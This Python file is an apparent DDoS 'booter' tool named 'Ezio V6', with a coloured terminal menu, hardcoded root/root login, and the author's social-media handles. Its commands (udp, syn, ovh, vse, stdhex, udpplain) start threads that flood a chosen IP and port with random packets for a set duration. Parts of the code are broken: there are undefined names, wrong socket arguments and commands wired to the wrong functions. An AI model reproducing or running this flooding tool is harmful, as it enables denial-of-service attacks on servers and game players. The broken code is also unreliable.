#!/usr/bin/env python3
#-*- coding: utf-8 -*-
import sys
import socket
import time
import random
import threading
import getpass
import os

sys.stdout.write("\x1b]2;\x1b[1;31m Ez\x1b[1;31m\033[01;97mio Made By Afftt\x07")
def modifications():
	print ("Contact Afftt The Script Is Currently Under Maitnance.")
	on_enter = input("Press Enter To Leave.")
	exit()
#column:65
game = """
\033[01;97m     -> |\x1b[1;31m Ezio Attack game\033[01;97m  | 
\033[1;31m ╔════════════════════════════════════════════╗   \033[0m 
\033[1;31m ║ !*udp [\033[97mip\033[1;31m] [\033[97mport\033[1;31m] [\033[97mtime\033[1;31m]   [\033[97msize\033[1;31m]          ║   \033[0m
\033[1;31m ║ !*game [\033[97mip\033[1;31m] [\033[97mport\033[1;31m] [\033[97mtime\033[1;31m]   [\033[97msize\033[1;31m]         ║   \033[0m
\033[1;31m ║ !*vse [\033[97mip\033[1;31m] [\033[97mport\033[1;31m] [\033[97mtime\033[1;31m]   [\033[97msize\033[1;31m]          ║   \033[0m
\033[1;31m ║ !*udpplain [\033[97mip\033[1;31m] [\033[97mport\033[1;31m] [\033[97mtime\033[1;31m] [\033[97msize\033[1;31m]       ║   \033[0m
\033[1;31m ╚════════════════════════════════════════════╝   \033[0m
"""

L1 = """      -> |\x1b[1;31m Ezio Attack layer1\033[01;97m  |
\033[1;31m ╔════════════════════════════════════════════╗   \033[0m 
\033[1;31m ║ !*stdhex [\033[97mip\033[1;31m] [\033[97mport\033[1;31m] [\033[97mtime\033[1;31m]   [\033[97msize\033[1;31m]       ║   \033[0m
\033[1;31m ║ !*syn [\033[97mip\033[1;31m] [\033[97mport\033[1;31m] [\033[97mtime\033[1;31m]   [\033[97msize\033[1;31m]          ║   \033[0m
\033[1;31m ║ !*ovh [\033[97mip\033[1;31m] [\033[97mport\033[1;31m] [\033[97mtime\033[1;31m] [\033[97msize\033[1;31m]            ║   \033[0m
\033[1;31m ╚════════════════════════════════════════════╝   \033[0m
"""

info = """

\033[1;31m方方方方方方方方方方方方方方方方方方方方方方方方方方方方方方方方
\033[1;31m方 \033[97mDiscord: \033[97mAfftt#9800\033[1;31m                                       方
\033[1;31m方 \033[97mInstagram: \033[97mwhat_ismy_ip\033[1;31m                                   方
\033[1;31m方 \033[97mXbox: \033[97mAfftt\033[1;31m                                               方
\033[1;31m方 \033[97mYouTube: \033[97mmwww.youtube.com/channel/UCzzP_D-6VcvLRxa7svjM3KA\033[1;31m方
\033[1;31m方方方方方方方方方方方方方方方方方方方方方方方方方方方方方方方方
"""

help = """
\033[1;31m   ╔══════════════\033[01;97m══════════════╗  
\033[1;31m   ║            ga\033[01;97mme            ║  
\033[1;31m   ║            to\033[01;97mols           ║  
\033[1;31m   ║            Lay\033[01;97mer1          ║  
\033[1;31m   ║             in\033[01;97mfo           ║
\033[1;31m   ║             c\033[01;97mls            ║ 
\033[1;31m   ║             ex\033[01;97mit           ║   
\033[1;31m   ╚══════════════\033[01;97m══════════════╝  
"""

tools = """
\033[1;31m╔═══════════════════════════════════════════════╗
\033[1;31m║  \033[97mType .stop To Stop All Attacks.             \033[1;31m ║
\033[1;31m║  \033[97mType .attacks To See All Running Attacks.   \033[1;31m ║
\033[1;31m║  \033[97mType .resolve (HOST) o Resolve A Domains IP.\033[1;31m ║
\033[1;31m║  \033[97mType .ping (HOST) (port) To Ping A Host.    \033[1;31m ║
\033[1;31m╚═══════════════════════════════════════════════╝
"""

banner = """
\033[1;31m      ███████╗███████╗\033[1;97m██╗ ██████╗                                                                             
\033[1;31m      ██╔════╝╚══███╔╝\033[1;97m██║██╔═══██╗                                                                                                                      
\033[1;31m      █████╗    ███╔╝ \033[1;97m██║██║   ██║                                                                                                                      
\033[1;31m      ██╔══╝   ███╔╝  \033[1;97m██║██║   ██║                                                                                                                      
\033[1;31m      ███████╗███████╗\033[1;97m██║╚██████╔╝                                                                                                                    
\033[1;31m      ╚══════╝╚══════╝\033[1;97m╚═╝ ╚═════╝   
\033[1;31m
\033[1;31m╔═════════════════════════════════════════════╗                                          
\033[1;31m║\033[1;97m- - - - - -\033[1;97mWelcome To \033[1;31mEz\033[1;97mio \033[1;31mV\033[1;97m6- - - - - -\033[1;31m     ║                                       
\033[1;31m║\033[1;97m- - - - - -\033[1;31mBuilt Ready And To Null\033[1;97m- - - - - -\033[1;31m║                                                                             
\033[1;31m║\033[1;97m- - -[\033[1;31m!\033[1;97m] Type A \033[1;97m? For A Command List [\033[1;31m!\033[1;97m]- - -\033[1;31m║                                   
\033[1;31m╚═════════════════════════════════════════════╝                                                                                                                                                                                                                                                                                                                                                               
                                                                          
"""

af = """
\033[1;31m                        方╔═╗┌─┐\033[1;97m┬┌─┐方     
\033[1;31m                        方║╣ ┌─┘\033[1;97m││ │方     
\033[1;31m                        方╚═╝└─┘\033[1;97m┴└─┘方    
\033[1;31m        ╔═════════════════════════════════════════════╗     
\033[1;31m        ║\033[1;97m- - - - - -\033[1;97mWelcome To \033[1;31mEz\033[1;97mio \033[1;31mV\033[1;97m6- - - - - -\033[1;31m     ║  
\033[1;31m        ║\033[1;97m- - - - - -\033[1;31mBuilt Ready And To Null\033[1;97m- - - - - -\033[1;31m║     
\033[1;31m        ║\033[1;97m- - -[\033[1;31m!\033[1;97m] Type A \033[1;97m? For A Command List [\033[1;31m!\033[1;97m]- - -\033[1;31m║  
\033[1;31m        ╚═════════════════════════════════════════════╝
"""  


cookie = open(".\x1b[1;31mEz\x1b[1;31m\033[01;97mio_Cookie","w+")

fsubs = 0
tpings = 0
liips = 0
tattacks = 0
uaid = 0
said = 0
iaid = 0
haid = 0
aid = 0
attack = True
vse = True
udp = True
syn = True
ovh = True
stdhex = True
udpplain = True



def udpplainsender(host, dport, timer, punch):
	global iaid
	global udpplain
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and udpplain and attack:
		sock.sendto(punch, (host, int(dport)))
	iaid -= 1
	aid -= 1


def synsender(host, dport, timer, punch):
	global said
	global syn
	global aid
	global tattacks
	timeout = time.time() + float(timer)
	sock = socket.socket (socket.AF_INET, socket.SOCK_RAW, socketvse_synCNT)

	said += 1
	tattacks += 1
	aid += 1
	while time.time() < timeout and syn and attack:
		sock.sendto(punch, (host, int(dport)))
	said -= 1
	aid -= 1

def udpender(host, dport, timer, punch):
	global uaid
	global udp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	
	uaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and udp and attack:
		sock.sendto(punch, (host, int(dport)))
	uaid -= 1
	aid -= 1

def ovhsender(host, dport, timer, punch):
	global iaid
	global ovh
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and ovh and attack:
		sock.sendto(punch, (host, int(dport)))
	iaid -= 1
	aid -= 1


def stdhexsender(host, dport, timer, punch):
	global iaid
	global stdhex
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and stdhex and attack:
		sock.sendto(punch, (host, int(dport)))
	iaid -= 1
	aid -= 1

def vsesender(host, dport, timer, punch):
	global haid
	global vse
	global aid
	global tattacks

	timeout = time.time() + float(timer)

	haid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and ovh and attack:
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.sendto(punch, (host, int(dport)))
			sock.close()
		except socket.error:
			pass

	haid -= 1
	aid -= 1


def main():
	global fsubs
	global tpings
	global liips
	global tattacks
	global uaid
	global said
	global iaid
	global haid
	global aid
	global attack
	global dp
	global syn
	global ovh
	global vse
	global std
	global udpplain
	global udp

	while True:
		sys.stdout.write("")
		sin = input("(\033[1;31mro\033[01;97mot\033[01;97m)=").lower()
		sinput = sin.split(" ")[0]
		if sinput == "cls":
			os.system ("clear")
			print (af)
			main()
		elif sinput == "?":
			print (help)
			main()
		elif sinput == "exit":
			exit()
		elif sinput == "game":
			print (game)
			main()
		elif sinput == "tools":
			print (tools)
			main()
		elif sinput == "layer1":
			print (L1)
			main()
		elif sinput == "info":
			print (info)
			main()
		elif sinput == ".attacks":
			print ("\n[\x1b[1;31mEz\x1b[1;31m\033[01;97mio] Total .Attacks: {}\n".format (aid))
			main()
		elif sinput == ".resolve":
			liips += 1
			host = sin.split(" ")[1]
			host_ip = socket.gethostbyname(host)
			print ("[\x1b[1;31mEz\x1b[1;31m\033[01;97mio] Host: {} \033[00m[Converted] {}".format (host, host_ip))
			main()
		elif sinput == ".ping":
			tpings += 1
			try:
				sinput, host, dport = sin.split(" ")
				print ("[\x1b[1;31mEz\x1b[1;31m\033[01;97mio] Starting Ping On Host: {}".format (host))
				try:
					ip = socket.gethostbyname(host)
				except socket.gaierror:
					print ("[\x1b[1;31mEz\x1b[1;31m\033[01;97mio] Host Un-Resolvable.")
					main()
				while True:
					try:
						sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
						sock.settimeout(2)
						start = time.time() * 1000
						sock.connect ((host, int(dport)))
						stop = int(time.time() * 1000 - start)
						sys.stdout.write("\x1b]2;E z i o [()ms] \x1b[1;31m Ez\x1b[1;31m\033[01;97mio\x07".format (stop))
						print ("\x1b[1;31m Ez\x1b[1;31m\033[01;97mio: {}:{} | Time: {}ms [UP]".format(ip, dport, stop))
						sock.close()
						time.sleep(1)
					except socket.error:
						sys.stdout.write("\x1b]2;E z i o |TIME OUT| \x1b[1;31m Ez\x1b[1;31m\033[01;97mio\x07")
						print ("\x1b[1;31m Ez\x1b[1;31m\033[01;97mio: {}:{} [DOWN]".format(ip, dport))
						time.sleep(1)
					except KeyboardInterrupt:
						print("")
						main()
			except ValueError:
				print ("[\x1b[1;31m Ez\x1b[1;31m\033[01;97mio] The Command {} Requires An Argument.".format (sinput))
				main()
		elif sinput == "!*udp":
			if username == "guests":
				print ("[\x1b[1;31m Ez\\x1b[1;31m\033[01;97mio]io You Are Not Allowed To Use This Method.")
				main()
			else:
				try:
					sinput, host, dport, timer, pack = sin.split(" ")
					socket.gethostbyname(host)
					print ("⌐╦\x1b[1;31m╦═─: {}\n".format (host))
					punch = random._urandom(int(pack))
					threading.Thread(target=udpender, args=(host, dport, timer, punch)).start()
				except ValueError:
					print ("[\x1b[1;31mEz\\x1b[1;31m\033[01;97mio]io The Command {} Requires An Argument.".format (sinput))
					main()
				except socket.gaierror:
					print ("[\x1b[1;31mEz\\x1b[1;31m\033[01;97mio]io Host: {} Invalid".format (host))
					main()
		elif sinput == "!*vse":
			try:
				sinput, host, dport, timer, pack = sin.split(" ")
				socket.gethostbyname(host)
				print ("⌐╦\x1b[1;31m╦═─: {}\n".format (host))
				punch = random._urandom(int(pack))
				threading.Thread(target=vsesender, args=(host, dport, timer, punch)).start()
			except ValueError:
				print ("[\x1b[1;31m Ez\\x1b[1;31m\033[01;97mio]io The Command {} Requires An Argument.".format (sinput))
				main()
			except socket.gaierror:
				print ("[\x1b[1;31m Ez\\x1b[1;31m\033[01;97mio]io Host: {} Invalid".format (host))
				main()
		elif sinput == "!*stdhex":
			try:
				sinput, host, dport, timer, pack = sin.split(" ")
				socket.gethostbyname(host)
				print ("⌐╦\x1b[1;31m╦═─: {}\n".format (host))
				punch = random._urandom(int(pack))
				threading.Thread(target=stdhexsender, args=(host, dport, timer, punch)).start()
			except ValueError:
				print ("[\x1b[1;31m Ez\x1b[1;31m\033[01;97mio] The Command {} Requires An Argument.".format (sinput))
				main()
			except socket.gaierror:
				print ("[\x1b[1;31m Ez\x1b[1;31m\033[01;97mio] Host: {} Invalid".format (host))
				main()
		elif sinput == "!*ovh":
			if username == "guests":
				print ("[\x1b[1;31m Ez\x1b[1;31m\033[01;97mio] You Are Not Allowed To Use This Method.")
				main()
			try:
				sinput, host, dport, timer, pack = sin.split(" ")
				socket.gethostbyname(host)
				print ("⌐╦\x1b[1;31m╦═─: {}\n".format (host))
				punch = random._urandom(int(pack))
				threading.Thread(target=stdhexsender, args=(host, dport, timer, punch)).start()
			except ValueError:
				print ("[\x1b[1;31m Ez\x1b[1;31m\033[01;97mio] The Command {} Requires An Argument.".format (sinput))
				main()
			except socket.gaierror:
				print ("[\x1b[1;31m Ez\x1b[1;31m\033[01;97mio]io Host: {} Invalid".format (host))
				main()
		elif sinput == "!*udpplain":
			if username == "guests":
				print ("[\x1b[1;31m Ez\x1b[1;31m\033[01;97mio]io You Are Not Allowed To Use This Method.")
				main()
			else:
				try:
					sinput, host, dport, timer, pack = sin.split(" ")
					socket.gethostbyname(host)
					print ("⌐╦\x1b[1;31m╦═─: {}\n".format (host))
					punch = random._urandom(int(pack))
					threading.Thread(target=ovhsender, args=(host, dport, timer, punch)).start()
				except ValueError:
					print ("[\x1b[1;31mEz\x1b[1;31m\033[01;97mio] The Command {} Requires An Argument.".format (sinput))
					main()
				except socket.gaierror:
					print ("[\x1b[1;31mEz\x1b[1;31m\033[01;97mio]io Host: {} Invalid".format (host))
					main()
		elif sinput == "!*syn":
			try:
				sinput, host, dport, timer, pack = sin.split(" ")
				socket.gethostbyname(host)
				print ("⌐╦\x1b[1;31m╦═─: {}\n".format (host))
				punch = random._urandom(int(pack))
				threading.Thread(target=ovhsender, args=(host, dport, timer, punch)).start()
			except ValueError:
				print ("[\x1b[1;31m Ez\x1b[1;31m\033[01;97mio]io The Command {} Requires An Argument.".format (sinput))
				main()
			except socket.gaierror:
				print ("[\x1b[1;31m Ez\x1b[1;31m\033[01;97mio]io\x1b[1;31m\033[01;97mio] Host: {} Invalid".format (host))
				main()
		elif sinput == ".stop":
			attack = False
			while not attack:
				if aid == 0:
					attack = True
		elif sinput == "stop":
			what = sin.split(" ")[1]
			if what == "udp":
				print ("Stoping All udp Attacks.")
				udp = False
				while not udp:
					if aid == 0:
						print ("[\x1b[1;31m Ez\x1b[1;31m\033[01;97mio] No udp Processes Running.")
						udp = True
						main()
			if what == "ovh":
				print ("Stopping all ovh attacks")
				ovh = False
				while not ovh:
					print ("[\x1b[1;31m Ez\x1b[1;31m\033[01;97mio] No ovh Processes Running.")
					udp = True
					main() 
try:
	users = ["root", "root"]
	clear = "clear"
	os.system (clear)
	username = getpass.getpass ("[\x1b[1;31mLog\x1b[1;31min\033[01;97m] ")
	if username in users:
		user = username
	else:
		print ("[\x1b[1;31mIncorrect\x1b[1;31 Exiting\033[01;97m]")
		exit()
except KeyboardInterrupt:
	print ("\nCtrl-C Has Been Pressed.")
	exit()
try:
	passwords = ["root", "root"]
	password = getpass.getpass ("[\x1b[1;31mPass\x1b[1;31mword\033[01;97m] ")
	if user == "root":
		if password == passwords[0]:
			print ("[*] Login Correct.")
			print ("[*] Type help To See Commands.")
			cookie.write("DIE")
			time.sleep(3)
			os.system (clear)
			try:
				os.system ("clear")
				print (banner)
				main()
			except KeyboardInterrupt:
				print ("\n[anime] Ctrl-C Has Been Pressed.")
				main()
		else:
			print ("[*] Incorrect, Exiting.")
			exit()
	if user == "root":
		if password == passwords[1]:
			print ("[*] Login Correct.")
			print ("[*] Certain Methods Will Not Be Available To You.")
			print ("[*] Type help To See Commands.")
			time.sleep(5)
			os.system (clear)
			try:
				os.system ("clear")
				print (banner)
				main()
			except KeyboardInterrupt:
				print ("\n[anime] Ctrl-C Has Been Pressed.")
				main()
		else:
			print ("[*] Incorrect, Exiting.")
			exit()
except KeyboardInterrupt:
	exit()